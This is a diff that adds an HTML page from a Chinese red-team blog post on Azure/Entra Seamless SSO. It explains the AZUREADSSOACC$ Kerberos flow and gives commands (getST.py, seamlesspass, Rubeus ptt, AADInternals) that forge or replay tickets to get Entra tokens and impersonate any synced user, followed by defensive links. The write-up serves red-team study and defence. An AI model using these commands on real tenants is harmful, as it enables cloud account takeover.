@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2026/08/15/Azure%20Seamless%20SSO/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2026/08/15/Azure%20Seamless%20SSO/","path":"2026/08/15/Azure Seamless SSO/","title":"Azure Seamless SSO"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Azure Seamless SSO | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Seamless-SSO"><span class="nav-text">Seamless SSO</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%81%E7%A8%8B"><span class="nav-text">工作原理及流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%85%8D%E7%BD%AESSO"><span class="nav-text">配置SSO</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSO%E5%88%A9%E7%94%A8"><span class="nav-text">SSO利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E5%B8%B8%E7%AD%BE%E5%8F%91"><span class="nav-text">正常签发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E5%88%B6%E4%BD%9C"><span class="nav-text">本地制作</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%98%B2%E8%8C%83"><span class="nav-text">防范</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-text">Reference</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/08/15/Azure%20Seamless%20SSO/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Azure Seamless SSO | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Azure Seamless SSO
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-08-15 00:00:00" itemprop="dateCreated datePublished" datetime="2026-08-15T00:00:00+08:00">2026-08-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Red-Team/" itemprop="url" rel="index"><span itemprop="name">Red-Team</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Azure/2-1774176097715-5.png"></p>
+<a id="more"></a>
+
+<h1 id="Seamless-SSO"><a href="#Seamless-SSO" class="headerlink" title="Seamless SSO"></a>Seamless SSO</h1><p>混合身份场景使用以下三种身份验证方法之一：</p>
+<ul>
+<li>密码哈希同步（PHS）</li>
+<li>直通式认证（PTA）</li>
+<li>联合身份验证服务（AD FS）</li>
+</ul>
+<p><strong>Microsoft Entra 无缝单点登录 (Microsoft Entra Seamless SSO)</strong> 可在用户尝试从公司网络内已加入域的公司设备访问Entra应用时自动登录认证。启用此功能后，用户无需输入密码即可登录 Microsoft Entra ID，此功能使用户能够轻松访问云端应用程序，而无需任何额外的本地组件。<strong>无缝单点登录 可以与PHS、PTA结合使用，但不适用于用于ADFS</strong></p>
+<p>Seamless SSO对于设备版本有一些区别，微软手册写道：</p>
+<blockquote>
+<p>SSO via primary refresh token vs. Seamless SSO<br>For Windows 10, Windows Server 2016, and later versions, it’s recommended to use SSO via primary refresh token (PRT). For Windows 7 and Windows 8.1, it’s recommended to use Seamless SSO. Seamless SSO needs the user’s device to be domain-joined, but it isn’t used on Windows 10 Microsoft Entra joined devices or Microsoft Entra hybrid joined devices. SSO on Microsoft Entra joined, Microsoft Entra hybrid joined, and Microsoft Entra registered devices works based on the Primary Refresh Token (PRT)</p>
+<p>SSO via PRT works once devices are registered with Microsoft Entra ID for Microsoft Entra hybrid joined, Microsoft Entra joined or personal registered devices via Add Work or School Account. For more information on how SSO works with Windows 10 using PRT, see: Primary Refresh Token (PRT) and Microsoft Entra ID</p>
+</blockquote>
+<p>对于 Windows 7 和 Windows 8.1，建议使用 seamless sso</p>
+<p>对于 Windows 10、Windows Server 2016 及更高版本，设备状态为 <strong>Entra Joined、Entra Hybrid Joined、Entra Registered</strong> 的设备使用 <strong>基于主刷新令牌 (PRT)</strong> 的sso机制，并不依赖seamless sso</p>
+<p>另外对于设备加入Entra的状态有以下：</p>
+<table>
+<thead>
+<tr>
+<th>设备状态</th>
+<th>AzureAdJoined</th>
+<th>DomainJoined</th>
+<th>WorkplaceJoined</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Entra Registered</td>
+<td>NO</td>
+<td>NO</td>
+<td>YES</td>
+</tr>
+<tr>
+<td>Entra Joined</td>
+<td>YES</td>
+<td>NO</td>
+<td>NO</td>
+</tr>
+<tr>
+<td>Entra Hybrid Joined</td>
+<td>YES</td>
+<td>YES</td>
+<td>NO</td>
+</tr>
+<tr>
+<td>仅本地 AD Joined</td>
+<td>NO</td>
+<td>YES</td>
+<td>NO</td>
+</tr>
+</tbody></table>
+<h1 id="工作原理及流程"><a href="#工作原理及流程" class="headerlink" title="工作原理及流程"></a>工作原理及流程</h1><p>在混合部署安装和配置期间：</p>
+<ul>
+<li>在 AD 中创建一个名为 <strong>AZUREADSSOACC$</strong> 的计算机账户</li>
+<li>账户添加多个SPN，其中重要的两个SPN在 Microsoft Entra 登录过程中使用<ul>
+<li>HTTP/aadg.windows.net.nsatc.net</li>
+<li>HTTP/autologon.microsoftazuread-sso.com</li>
+</ul>
+</li>
+<li>账户生成Kerberos解密密钥，支持 AES256_HMAC_SHA1、AES128_HMAC_SHA1、RC4_HMAC_MD5</li>
+<li>将解密密钥发送到Entra ID</li>
+</ul>
+<p>网页浏览器下身份验证工作流程如下：</p>
+<ul>
+<li>当用户从域网络访问Entra Web 应用，如果用户尚未登录，将用户重定向到 login.microsoftonline.com 登录页面</li>
+<li>输入用户名</li>
+<li>Entra ID 在后台使用 iframe JS，返回带有 WWW-Authenticate 标头的401未授权响应向浏览器发出挑战，要求其提供 Kerberos 票据</li>
+<li>浏览器遵守规定</li>
+<li>浏览器使用当前用户的身份向 AD 请求 Kerberos 票据</li>
+<li>AD 查找请求自动登录的域，发现它是 AZUREADSSOACC$ 的 SPN</li>
+<li>AD 生成一个使用 AZUREADSSOACC$ 密钥加密的 Kerberos 票据</li>
+<li>浏览器将从 AD 获取的 Kerberos 票据转发给 Entra ID</li>
+<li>Entra ID 使用先前共享的密钥解密 Kerberos 票据</li>
+<li>票据解密评估完成后，Entra ID 要么将令牌返回给应用程序，要么要求用户满足其他验证要求，例如MFA、Conditional Access Policies (CAP)</li>
+<li>浏览器使用令牌自动登录</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Azure/sso2.png"></p>
+<h1 id="配置SSO"><a href="#配置SSO" class="headerlink" title="配置SSO"></a>配置SSO</h1><p>在快速设置页面，选择 <strong>Customize</strong> 以开始自定义设置安装，在 User sign-in 页面上选择 启用单点登录 选项。在 Microsoft Entra Connect 1.1.880.0 或更高版本，默认情况下会选中 启用单点登录 选项</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Azure/image-20260814003100294.png" alt="image-20260814003100294"></p>
+<h1 id="SSO利用"><a href="#SSO利用" class="headerlink" title="SSO利用"></a>SSO利用</h1><p>如果攻击者控制了此帐户，可以使用AZUREADSSOACC$帐户密钥代表任何用户生成服务票证，从而冒充从AD同步到Entra ID中的任何用户，包括拥有特权角色的管理员。总之其利用核心就是kerberos票据，那么利用方式就有两种：</p>
+<ul>
+<li>获取目标用户的 Kerberos 身份上下文后，模拟正常 SSO 流程，访问Entra后与KDC交互获取加密票据</li>
+<li>本地直接利用AZUREADSSOACC$制作加密票据，无需与KDC交互</li>
+</ul>
+<h2 id="正常签发"><a href="#正常签发" class="headerlink" title="正常签发"></a>正常签发</h2><p>获取目标用户kerberos 上下文，通过 impacket rubeus 都可获取TGT/TGS</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getST.py -dc-ip 10.0.0.1 -spn http&#x2F;autologon.microsoftazuread-sso.com test.local&#x2F;admin:password</span><br></pre></td></tr></table></figure>
+
+<p>使用 seamlesspass 可以直接通过票据获取AccessToken，在后续TUI工具中使用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">seamlesspass -tenant test.com -domain test.local -dc dc.test.local -tgt &lt;base64_encoded_TGT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>也可以通过配置浏览器，<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso-quick-start#browser-considerations">sso支持 ie edge chrome firefox</a>，以火狐为例</p>
+<ul>
+<li><p>将某些 URL 添加到受信任区域</p>
+<ul>
+<li><p>在导航栏中，输入 about:config</p>
+</li>
+<li><p>搜索 network.negotiate-auth.trusted-uris 首选项</p>
+</li>
+<li><p>添加以下网址：<code>https://autologon.microsoftazuread-sso.com</code></p>
+</li>
+</ul>
+</li>
+<li><p>在设置中启用 Windows 单点登录：</p>
+<ul>
+<li><p>前往设置</p>
+</li>
+<li><p>启用 <code>允许 Microsoft、工作和学校帐户使用 Windows 单点登录</code></p>
+</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Azure/image-20260815112456808.png" alt="image-20260815112456808"></p>
+</li>
+</ul>
+<p>通过 Rubeus PTT，启动firefox，访问 login.microsoftonline.com</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe ptt &#x2F;ticket:xxx &amp; &quot;C:\Program Files\Mozilla Firefox\firefox.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="本地制作"><a href="#本地制作" class="headerlink" title="本地制作"></a>本地制作</h2><p>通过 AADInternals 直接制作加密票据，并申请Graph AccessToken</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$kerberosTicket&#x3D;New-AADIntKerberosTicket -SidString &lt;AD user SID&gt; -Hash &lt;AZUREADSSOACC$ NTLM Hash&gt;</span><br><span class="line">$kerberosTicket</span><br><span class="line">$AADGraphToken&#x3D;Get-AADIntAccessTokenForAADGraph KerberosTicket $kerberosTicket -Domain &quot;test.local&quot;</span><br><span class="line">$AADGraphToken</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Azure/sso3.png"></p>
+<p>也可以用浏览器bp抓包，替换</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Azure/image-20260815122124149.png" alt="image-20260815122124149"></p>
+<h1 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h1><p>定时更换密钥：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cloudcoffee.ch/microsoft-azure/microsoft-entra-id-automatically-roll-over-kerberos-decryption-key/">https://www.cloudcoffee.ch/microsoft-azure/microsoft-entra-id-automatically-roll-over-kerberos-decryption-key/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cloudcoffee.ch/microsoft-azure/azure-ad-roll-over-kerberos-decryption-key/">https://www.cloudcoffee.ch/microsoft-azure/azure-ad-roll-over-kerberos-decryption-key/</a></p>
+<p>禁用SSO:</p>
+<p><a target="_blank" rel="noopener" href="https://ourcloudnetwork.com/why-you-should-disable-seamless-sso-in-microsoft-entra-connect/">https://ourcloudnetwork.com/why-you-should-disable-seamless-sso-in-microsoft-entra-connect/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cloudcoffee.ch/microsoft-azure/disable-entra-connect-seamless-sso/">https://www.cloudcoffee.ch/microsoft-azure/disable-entra-connect-seamless-sso/</a></p>
+<p>日志记录：</p>
+<p><a target="_blank" rel="noopener" href="https://nathanmcnulty.com/blog/2025/08/finding-seamless-sso-usage/">https://nathanmcnulty.com/blog/2025/08/finding-seamless-sso-usage/</a></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>Seamless SSO：</p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso">https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso</a></p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-gb/entra/identity/hybrid/connect/how-to-connect-sso-how-it-works">https://learn.microsoft.com/en-gb/entra/identity/hybrid/connect/how-to-connect-sso-how-it-works</a></p>
+<p><a target="_blank" rel="noopener" href="https://syfuhs.net/2017/03/19/a-look-at-azure-ad-single-sign-on/">https://syfuhs.net/2017/03/19/a-look-at-azure-ad-single-sign-on/</a></p>
+<p><a target="_blank" rel="noopener" href="https://nathanmcnulty.com/blog/2025/08/finding-seamless-sso-usage/">https://nathanmcnulty.com/blog/2025/08/finding-seamless-sso-usage/</a></p>
+<p>配置SSO：</p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso-quick-start">https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso-quick-start</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.alitajran.com/install-and-configure-microsoft-entra-connect/">https://www.alitajran.com/install-and-configure-microsoft-entra-connect/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cloudcoffee.ch/microsoft-azure/hybrid-azure-ad-join-configuration/">https://www.cloudcoffee.ch/microsoft-azure/hybrid-azure-ad-join-configuration/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cayosoft.com/microsoft-entra/microsoft-entra-connect-sync/">https://www.cayosoft.com/microsoft-entra/microsoft-entra-connect-sync/</a></p>
+<p>SSO利用：</p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/hybrid-security">https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/hybrid-security</a></p>
+<p><a target="_blank" rel="noopener" href="https://specterops.io/blog/2025/12/11/azure-seamless-sso-when-cookie-theft-doesnt-cut-it/">https://specterops.io/blog/2025/12/11/azure-seamless-sso-when-cookie-theft-doesnt-cut-it/</a></p>
+<p><a target="_blank" rel="noopener" href="https://malcrove.com/seamlesspass-leveraging-kerberos-tickets-to-access-the-cloud/">https://malcrove.com/seamlesspass-leveraging-kerberos-tickets-to-access-the-cloud/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.trustedsec.com/blog/azure-ad-kerberos-tickets-pivoting-to-the-cloud">https://www.trustedsec.com/blog/azure-ad-kerberos-tickets-pivoting-to-the-cloud</a></p>
+<p><a target="_blank" rel="noopener" href="https://echeloncyber.com/intelligence/entry/cyber-threat-alert-abusing-azureadssoacc-for-pivoting-from-on-premises-active-directory-to-azure">https://echeloncyber.com/intelligence/entry/cyber-threat-alert-abusing-azureadssoacc-for-pivoting-from-on-premises-active-directory-to-azure</a></p>
+<p><a target="_blank" rel="noopener" href="https://dirkjanm.io/assets/raw/TR19-Im%20in%20your%20cloud.pdf">https://dirkjanm.io/assets/raw/TR19-Im%20in%20your%20cloud.pdf</a></p>
+<p><a target="_blank" rel="noopener" href="https://aadinternals.com/talks/NVS%202021.pdf">https://aadinternals.com/talks/NVS%202021.pdf</a></p>
+<p>《AD域攻防权威指南》</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/05/28/KernelCallback-1/" rel="prev" title="Windows Kernel Callbacks">
+                  <i class="fa fa-angle-left"></i> Windows Kernel Callbacks
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
